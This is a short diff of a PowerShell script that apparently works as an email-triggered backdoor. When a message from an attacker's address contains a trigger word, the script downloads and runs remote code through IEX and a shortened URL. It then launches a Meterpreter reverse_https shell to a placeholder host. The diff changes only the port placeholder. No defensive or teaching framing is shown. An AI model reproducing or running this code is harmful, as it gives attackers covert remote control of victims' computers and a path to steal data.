@@ -11,7 +11,7 @@ $Emails | foreach {
 if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT xxxx -Force}
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT yyyy -Force}
 }}
 
 $Emails | foreach { 
